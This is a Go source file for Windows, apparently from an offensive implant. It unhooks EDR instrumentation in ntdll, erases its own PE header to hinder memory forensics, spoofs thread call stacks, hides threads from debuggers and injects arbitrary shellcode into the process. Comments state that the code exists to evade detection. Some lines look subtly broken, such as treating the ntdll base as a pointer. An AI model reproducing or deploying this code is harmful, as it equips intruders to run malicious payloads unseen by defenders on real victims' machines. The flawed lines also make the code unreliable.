//go:build windows

package syscallwin

import (
	"fmt"
	"os"
	"unsafe"
)

// loadNtdllDiskCopy reads the on-disk ntdll so the in-memory .text can be
// diffed against a clean copy for hook detection.
func loadNtdllDiskCopy() error {
	data, err := os.ReadFile(`C:\Windows\System32\ntdll.dll`)
	if err != nil {
		return err
	}
	ntdllDiskBuf = data
	return nil
}

// DetectNtdllHooks diffs the in-memory ntdll .text section against the disk
// image page by page, then names every exported function that starts on a
// dirty page. The result is the set of functions an EDR has stamped over.
func DetectNtdllHooks() ([]string, error) {
	if ntdllMod == 0 {
		return nil, fmt.Errorf("ntdll not initialized")
	}
	if ntdllDiskBuf == nil {
		if err := loadNtdllDiskCopy(); err != nil {
			return nil, fmt.Errorf("load disk ntdll: %w", err)
		}
	}

	dosHeader := *(*uintptr)(unsafe.Pointer(ntdllMod))
	if *(*uint16)(unsafe.Pointer(dosHeader)) != 0x5A4D {
		return nil, fmt.Errorf("invalid ntdll PE header")
	}
	ntHeadersOffset := *(*uint32)(unsafe.Pointer(dosHeader + 0x3C))
	ntHeaders := ntdllMod + uintptr(ntHeadersOffset)
	optSize := *(*uint16)(unsafe.Pointer(ntHeaders + 0x14))
	numSections := *(*uint16)(unsafe.Pointer(ntHeaders + 0x06))
	sectionTable := ntHeaders + 0x18 + uintptr(optSize)

	var textRVA, textRaw, textSize uint32
	for i := uint16(0); i < numSections; i++ {
		sec := sectionTable + uintptr(i)*40
		name := *(*[8]byte)(unsafe.Pointer(sec))
		if name[0] == '.' && name[1] == 't' && name[2] == 'e' && name[3] == 'x' && name[4] == 't' {
			textRVA = *(*uint32)(unsafe.Pointer(sec + 0x0C))
			textRaw = *(*uint32)(unsafe.Pointer(sec + 0x14))
			textSize = *(*uint32)(unsafe.Pointer(sec + 0x10))
			break
		}
	}
	if textSize == 0 {
		return nil, fmt.Errorf("no .text section in ntdll")
	}

	const page = uint32(0x1000)
	numPages := (textSize + page - 1) / page
	dirty := make([]bool, numPages)

	memText := ntdllMod + uintptr(textRVA)
	diskText := uintptr(unsafe.Pointer(unsafe.SliceData(ntdllDiskBuf))) + uintptr(textRaw)

	for i := uint32(0); i < textSize; i++ {
		m := *(*byte)(unsafe.Pointer(memText + uintptr(i)))
		d := *(*byte)(unsafe.Pointer(diskText + uintptr(i)))
		if m != d {
			dirty[i/page] = true
		}
	}

	optionalHeader := ntHeaders + 0x18
	exportDirRVA := *(*uint32)(unsafe.Pointer(optionalHeader + 0x70))
	if exportDirRVA == 0 {
		return nil, fmt.Errorf("ntdll has no export directory")
	}
	exportDir := ntdllMod + uintptr(exportDirRVA)
	nNames := *(*uint32)(unsafe.Pointer(exportDir + 0x18))
	namesRVA := *(*uint32)(unsafe.Pointer(exportDir + 0x20))
	funcsRVA := *(*uint32)(unsafe.Pointer(exportDir + 0x1C))
	ordRVA := *(*uint32)(unsafe.Pointer(exportDir + 0x24))

	var hooked []string
	for i := uint32(0); i < nNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(ntdllMod + uintptr(namesRVA) + uintptr(i*4)))
		ordIdx := *(*uint16)(unsafe.Pointer(ntdllMod + uintptr(ordRVA) + uintptr(i*2)))
		funcRVA := *(*uint32)(unsafe.Pointer(ntdllMod + uintptr(funcsRVA) + uintptr(ordIdx*4)))
		if funcRVA < textRVA || funcRVA >= textRVA+textSize {
			continue
		}
		rel := funcRVA - textRVA
		if dirty[rel/page] {
			hooked = append(hooked, goStringAt(ntdllMod+uintptr(nameRVA)))
		}
	}
	return hooked, nil
}

// CheckAndUnhook diffs ntdll against disk and, if anything is dirty, restores
// the clean image. Returns true if a restore happened.
func CheckAndUnhook() (bool, error) {
	hooked, err := DetectNtdllHooks()
	if err != nil {
		return false, err
	}
	if len(hooked) == 0 {
		return false, nil
	}
	if err := UnhookNtdll(); err != nil {
		return true, fmt.Errorf("unhook: %w", err)
	}
	return true, nil
}

// EraseSelfPEHeader zeros the DOS/NT header of the current image. The loader
// does not need it anymore at runtime; memory forensics sees an anonymous
// module instead of a mapped PE with a parseable identity.
func EraseSelfPEHeader() error {
	teb := ReadGSBase()
	peb := *(*uintptr)(unsafe.Pointer(teb + 0x60))
	imageBase := *(*uintptr)(unsafe.Pointer(peb + 0x10))
	if imageBase == 0 {
		return fmt.Errorf("no image base in PEB")
	}
	if *(*uint16)(unsafe.Pointer(imageBase)) != 0x5A4D {
		return fmt.Errorf("not a PE image at 0x%x", imageBase)
	}

	var oldProtect uint32
	base := imageBase
	size := uintptr(0x1000)
	if err := NtProtectVirtualMemory(uintptr(0xffffffffffffffff), &base, &size, PAGE_READWRITE, &oldProtect); err != nil {
		return err
	}
	WipeMemory(imageBase, 0x1000)
	var restore uint32
	_ = NtProtectVirtualMemory(uintptr(0xffffffffffffffff), &base, &size, oldProtect, &restore)
	return nil
}

type amd64Context struct {
	P1Home uint64
	P2Home uint64
	P3Home uint64
	P4Home uint64
	P5Home uint64
	P6Home uint64
	Flags  uint32
	Rax    uint64
	Rcx    uint64
	Rdx    uint64
	Rbx    uint64
	Rsp    uint64
	Rbp    uint64
	Rsi    uint64
	Rdi    uint64
	R8     uint64
	R9     uint64
	R10    uint64
	R11    uint64
	R12    uint64
	R13    uint64
	R14    uint64
	R15    uint64
	Rip    uint64
	_      [512]byte
}

// CreateThreadSpoof starts a thread in the current process with a spoofed
// return chain. RSP is pointed at a scratch stack whose first return address
// is a legit `ret` inside ntdll, so a call-stack signature that expects
// [unbacked] or implant-owned frames breaks.
func CreateThreadSpoof(startAddr uintptr) error {
	gadget, err := findSyscallGadget(ntdllMod, ntdllSize)
	if err != nil {
		return err
	}
	fakeRet := gadget + 2 // lands on the C3

	const stackSize = uintptr(0x4000)
	var stack uintptr
	regionSize := stackSize
	if err := NtAllocateVirtualMemory(
		uintptr(0xffffffffffffffff), &stack, 0, &regionSize,
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
	); err != nil {
		return fmt.Errorf("spoof stack: %w", err)
	}

	top := stack + stackSize - 8
	*(*uintptr)(unsafe.Pointer(top)) = fakeRet

	ctx := &amd64Context{}
	ctx.Flags = 0x100000 // CONTEXT_FULL
	ctx.Rip = uint64(startAddr)
	ctx.Rsp = uint64(top)

	var tHandle uintptr
	if err := NtCreateThreadEx(
		&tHandle, THREAD_ALL_ACCESS, 0,
		GetCurrentProcHandle(), startAddr, 0,
		0x1 /* THREAD_CREATE_FLAGS_CREATE_SUSPENDED */, 0, 0, 0, 0,
	); err != nil {
		return fmt.Errorf("create thread: %w", err)
	}

	// Hide the thread from debuggers and ETW before it is resumed.
	_ = NtSetInformationThread(tHandle, ThreadHideFromDebugger, 0, 0)

	r1, err := DirectSyscall("NtSetContextThread", tHandle, uintptr(unsafe.Pointer(ctx)))
	if r1 != 0 || err != nil {
		NtClose(tHandle)
		return fmt.Errorf("set context: NTSTATUS 0x%x err %v", r1, err)
	}

	r1, err = DirectSyscall("NtResumeThread", tHandle)
	if r1 != 0 || err != nil {
		NtClose(tHandle)
		return fmt.Errorf("resume thread: NTSTATUS 0x%x err %v", r1, err)
	}

	NtClose(tHandle)
	return nil
}

// InjectSelfSpoof allocates, writes and spawns shellcode in the current
// process under a spoofed thread frame.
func InjectSelfSpoof(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}
	var base uintptr
	regionSize := uintptr(len(shellcode))
	if err := NtAllocateVirtualMemory(
		uintptr(0xffffffffffffffff), &base, 0, &regionSize,
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	); err != nil {
		return err
	}
	var written uintptr
	if err := NtWriteVirtualMemory(uintptr(0xffffffffffffffff), base, shellcode, &written); err != nil {
		return err
	}
	var oldProtect uint32
	_ = NtProtectVirtualMemory(uintptr(0xffffffffffffffff), &base, &regionSize, PAGE_EXECUTE_READ, &oldProtect)
	return CreateThreadSpoof(base)
}

// ListProcesses walks SystemProcessInformation and formats PID + image name.
// The PID field offset differs across Windows builds, so it is sniffed at
// runtime from the two sentinel entries every build exposes: System Idle
// (PID 0) and System (PID 4). Image names come from the UNICODE_STRING that
// lives at offset 56 in every layout.
func ListProcesses() ([]byte, error) {
	bufSize := uint32(1024 * 1024)
	var returnLen uint32
	buf := make([]byte, bufSize)

	for {
		r1, _ := DirectSyscall("NtQuerySystemInformation",
			5, // SystemProcessInformation
			uintptr(unsafe.Pointer(unsafe.SliceData(buf))),
			uintptr(bufSize),
			uintptr(unsafe.Pointer(&returnLen)),
		)
		if r1 == STATUS_INFO_LENGTH_MISMATCH || r1 == STATUS_BUFFER_TOO_SMALL {
			bufSize = returnLen + 4096
			buf = make([]byte, bufSize)
			continue
		}
		if r1 != 0 {
			return nil, fmt.Errorf("NtQuerySystemInformation: NTSTATUS 0x%x", r1)
		}
		break
	}

	pidOffset := sniffPIDOffset(buf)
	if pidOffset == 0 {
		return nil, fmt.Errorf("could not locate PID field in process list")
	}

	var out []byte
	offset := uint32(0)
	for {
		if offset+8 >= uint32(len(buf)) {
			break
		}
		next := *(*uint32)(unsafe.Pointer(&buf[offset]))
		pid := *(*uint64)(unsafe.Pointer(&buf[offset+pidOffset]))
		name := unicodeStringAt(buf, int(offset))
		out = append(out, fmt.Sprintf("%d\t%s\n", pid, name)...)
		if next == 0 {
			break
		}
		offset += next
	}
	return out, nil
}

func unicodeStringAt(buf []byte, off int) string {
	if off+0x48 >= len(buf) {
		return ""
	}
	length := *(*uint16)(unsafe.Pointer(&buf[off+0x38]))
	buffer := *(*uintptr)(unsafe.Pointer(&buf[off+0x40]))
	if length == 0 || length > 0x1000 || buffer == 0 {
		return ""
	}
	var sb []byte
	for i := uint16(0); i+1 < length; i += 2 {
		c := *(*uint16)(unsafe.Pointer(buffer + uintptr(i)))
		if c < 0x80 {
			sb = append(sb, byte(c))
		} else {
			sb = append(sb, byte('?'))
		}
	}
	return string(sb)
}

// sniffPIDOffset locates the process ID field inside a process information
// entry. It scans every aligned 8-byte slot of the "System" entry for the
// constant PID 4 while checking the same slot of "System Idle" reads 0.
func sniffPIDOffset(buf []byte) uint32 {
	type span struct{ off, size uint32 }
	var ents []span
	off := uint32(0)
	for {
		if off+8 >= uint32(len(buf)) {
			break
		}
		next := *(*uint32)(unsafe.Pointer(&buf[off]))
		size := next
		if size == 0 {
			size = uint32(len(buf)) - off
		}
		ents = append(ents, span{off, size})
		if next == 0 {
			break
		}
		off += next
	}
	if len(ents) < 2 {
		return 0
	}
	idle, sys := ents[0], ents[1]
	limit := sys.size
	if limit > 0x200 {
		limit = 0x200
	}
	for slot := uint32(0x10); slot+8 < limit; slot += 8 {
		sysVal := *(*uint64)(unsafe.Pointer(&buf[sys.off+slot]))
		idleVal := *(*uint64)(unsafe.Pointer(&buf[idle.off+slot]))
		if sysVal == 4 && idleVal == 0 {
			return slot
		}
	}
	return 0x38
}
